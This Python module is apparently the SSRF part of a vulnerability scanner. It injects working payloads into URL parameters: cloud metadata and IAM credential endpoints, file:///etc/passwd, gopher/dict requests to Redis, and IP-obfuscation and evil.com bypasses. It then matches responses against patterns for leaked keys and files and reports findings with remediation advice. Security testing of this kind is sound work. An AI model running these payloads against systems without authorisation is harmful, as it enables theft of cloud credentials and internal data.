"""
GrotAssault — SSRF (Server-Side Request Forgery) payloads and detection.

Provides:
  - Payload sets targeting cloud metadata services, internal networks,
    protocol handlers, and DNS rebinding
  - Response analysis to detect successful SSRF exploitation
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass
from typing import List, Optional
from urllib.parse import urlparse

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.ssrf")


# ---------------------------------------------------------------------------
# Payload databases
# ---------------------------------------------------------------------------

# Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
_CLOUD_METADATA_PAYLOADS: List[str] = [
    "http://169.254.169.254/latest/meta-data/",                     # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",          # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://169.254.169.254/metadata/v1/",                          # DigitalOcean
]

# Internal network probing
_INTERNAL_NETWORK_PAYLOADS: List[str] = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
]

# URL scheme / protocol handlers
_PROTOCOL_HANDLER_PAYLOADS: List[str] = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO",
    "ftp://127.0.0.1/",
]

# Bypass techniques (IP obfuscation, redirects)
_BYPASS_PAYLOADS: List[str] = [
    "http://0x7f000001/",                       # hex IP for 127.0.0.1
    "http://2130706433/",                        # decimal IP for 127.0.0.1
    "http://017700000001/",                      # octal IP
    "http://127.1/",                             # short form
    "http://127.0.0.1.nip.io/",                 # DNS rebinding via nip.io
    "http://0177.0.0.1/",                       # octal dotted
    "http://127.0.0.1%00@evil.com/",            # null byte injection
    "http://evil.com@127.0.0.1/",               # authority confusion
]

ALL_SSRF_PAYLOADS: List[str] = (
    _CLOUD_METADATA_PAYLOADS
    + _INTERNAL_NETWORK_PAYLOADS
    + _PROTOCOL_HANDLER_PAYLOADS
    + _BYPASS_PAYLOADS
)


# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

# AWS metadata response indicators
_AWS_META_PATTERNS = [
    re.compile(r"ami-id|instance-id|security-credentials", re.IGNORECASE),
    re.compile(r"iam/security-credentials", re.IGNORECASE),
    re.compile(r"AccessKeyId|SecretAccessKey", re.IGNORECASE),
]

# GCP metadata
_GCP_META_PATTERNS = [
    re.compile(r"computeMetadata|project-id|instance/zone", re.IGNORECASE),
]

# Azure metadata
_AZURE_META_PATTERNS = [
    re.compile(r"\"compute\".*\"location\"", re.IGNORECASE),
    re.compile(r"azEnvironment|subscriptionId", re.IGNORECASE),
]

# Local file content
_LOCAL_FILE_PATTERNS = [
    re.compile(r"root:.*:0:0:"),              # /etc/passwd
    re.compile(r"\[fonts\]", re.IGNORECASE),  # win.ini
]

# Internal service indicators
_INTERNAL_SERVICE_PATTERNS = [
    re.compile(r"redis_version:", re.IGNORECASE),             # Redis
    re.compile(r"<title>.*dashboard.*</title>", re.IGNORECASE),
    re.compile(r"Server:\s*(?:Apache|nginx)", re.IGNORECASE),
]


# ---------------------------------------------------------------------------
# SsrfChecker
# ---------------------------------------------------------------------------

@dataclass
class SsrfResult(HttpClientMixin):
    """Result of a single SSRF payload probe."""
    payload_category: str
    payload_url: str
    status_code: int
    body_snippet: str
    cloud_meta_leaked: bool = False
    local_file_leaked: bool = False
    internal_service_reached: bool = False


class SsrfChecker(HttpClientMixin):
    """Test endpoints for Server-Side Request Forgery vulnerabilities.

    Injects SSRF payloads into URL-type parameters and analyses responses
    for signs of successful internal access.

    Parameters
    ----------
    http_client:
        Optional shared :class:`HttpClient`.
    """

    def __init__(
        self, *, http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def check(self, target: Target, url_params: Optional[List[str]] = None) -> List[Finding]:
        """Inject SSRF payloads into *target* and analyse responses.

        Parameters
        ----------
        target:
            The endpoint to test.
        url_params:
            Parameter names that accept URL values (e.g. ``["url", "callback"]``).
            If not provided, common parameter names are tried.
        """
        client = self._client or HttpClient(timeout=15.0, retries=0)
        try:
            findings: List[Finding] = []

            params_to_test = url_params or self._detect_url_params(target)
            if not params_to_test:
                return findings

            for param_name in params_to_test:
                for category, payloads in [
                    ("cloud_metadata", _CLOUD_METADATA_PAYLOADS),
                    ("internal_network", _INTERNAL_NETWORK_PAYLOADS),
                    ("protocol_handler", _PROTOCOL_HANDLER_PAYLOADS),
                    ("bypass", _BYPASS_PAYLOADS),
                ]:
                    for payload_url in payloads:
                        result = await self._send_payload(
                            client, target, param_name, payload_url, category,
                        )
                        if result and (
                            result.cloud_meta_leaked
                            or result.local_file_leaked
                            or result.internal_service_reached
                        ):
                            findings.append(
                                self._result_to_finding(result, target, param_name)
                            )
                            # One finding per category per param is enough
                            break

            return findings
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_url_params(target: Target) -> List[str]:
        """Heuristic: find parameter names that likely accept URLs."""
        url_hints = {"url", "uri", "link", "href", "callback", "redirect",
                     "next", "return", "dest", "destination", "target",
                     "path", "file", "page", "fetch", "load", "src"}

        found: List[str] = []

        # Check query string
        parsed = urlparse(target.url)
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query)
            for param in qs:
                if param.lower() in url_hints:
                    found.append(param)

        # Check JSON body keys
        if target.body:
            import json
            try:
                body = json.loads(target.body)
                if isinstance(body, dict):
                    for key in body:
                        if key.lower() in url_hints:
                            found.append(key)
            except (json.JSONDecodeError, TypeError):
                pass

        # Check metadata for known URL params
        meta_params = target.metadata.get("url_params", [])
        if isinstance(meta_params, list):
            found.extend(meta_params)

        return found

    async def _send_payload(
        self,
        client: HttpClient,
        target: Target,
        param_name: str,
        payload_url: str,
        category: str,
    ) -> Optional[SsrfResult]:
        """Inject *payload_url* into *param_name* and analyse the response."""
        import json

        # Determine injection point — query string vs body
        parsed = urlparse(target.url)
        method = target.method.upper()

        try:
            if method in ("POST", "PUT", "PATCH") and target.body:
                # Inject into JSON body
                try:
                    body = json.loads(target.body)
                    if isinstance(body, dict) and param_name in body:
                        body[param_name] = payload_url
                        resp = await client.request(
                            method,
                            target.url,
                            headers={**target.headers, "Content-Type": "application/json"},
                            body=json.dumps(body),
                        )
                    else:
                        return None
                except (json.JSONDecodeError, TypeError):
                    return None
            else:
                # Inject into query string
                from urllib.parse import parse_qs, urlencode, urlunparse
                qs = parse_qs(parsed.query, keep_blank_values=True)
                if param_name not in qs:
                    return None
                qs[param_name] = [payload_url]
                flat_qs = {k: v[0] for k, v in qs.items()}
                new_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(flat_qs), parsed.fragment,
                ))
                resp = await client.request(method, new_url, headers=target.headers)
        except (httpx.HTTPError, OSError):
            return None

        body = resp.text[:4096]

        cloud_leaked = any(
            p.search(body)
            for patterns in (_AWS_META_PATTERNS, _GCP_META_PATTERNS, _AZURE_META_PATTERNS)
            for p in patterns
        )
        file_leaked = any(p.search(body) for p in _LOCAL_FILE_PATTERNS)
        internal_reached = any(p.search(body) for p in _INTERNAL_SERVICE_PATTERNS)

        return SsrfResult(
            payload_category=category,
            payload_url=payload_url,
            status_code=resp.status_code,
            body_snippet=body[:200],
            cloud_meta_leaked=cloud_leaked,
            local_file_leaked=file_leaked,
            internal_service_reached=internal_reached,
        )

    # ------------------------------------------------------------------
    # Finding construction
    # ------------------------------------------------------------------

    @staticmethod
    def _result_to_finding(
        result: SsrfResult, target: Target, param_name: str,
    ) -> Finding:
        if result.cloud_meta_leaked:
            return Finding(
                title=f"SSRF: cloud metadata leaked via '{param_name}'",
                description=(
                    f"The parameter '{param_name}' on {target.url} returned "
                    f"cloud metadata content when given payload {result.payload_url}. "
                    "An attacker can steal IAM credentials and escalate privileges."
                ),
                severity=Severity.CRITICAL,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Block requests to cloud metadata endpoints (169.254.169.254). "
                    "Use IMDSv2 (token-required) on AWS. Validate and allowlist URLs."
                ),
                cwe=918,
                tags=["ssrf", "cloud-metadata", "iam"],
            )
        elif result.local_file_leaked:
            return Finding(
                title=f"SSRF: local file read via '{param_name}'",
                description=(
                    f"The parameter '{param_name}' on {target.url} returned "
                    f"local file content when given payload {result.payload_url}."
                ),
                severity=Severity.HIGH,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Block file:// and other non-HTTP protocol handlers. "
                    "Validate and allowlist target URLs."
                ),
                cwe=918,
                tags=["ssrf", "file-read"],
            )
        else:
            return Finding(
                title=f"SSRF: internal service reached via '{param_name}'",
                description=(
                    f"The parameter '{param_name}' on {target.url} reached an "
                    f"internal service when given payload {result.payload_url}."
                ),
                severity=Severity.HIGH,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Implement server-side URL validation with an allowlist. "
                    "Block access to internal network ranges (10.x, 172.16-31.x, 192.168.x)."
                ),
                cwe=918,
                tags=["ssrf", "internal-access"],
            )
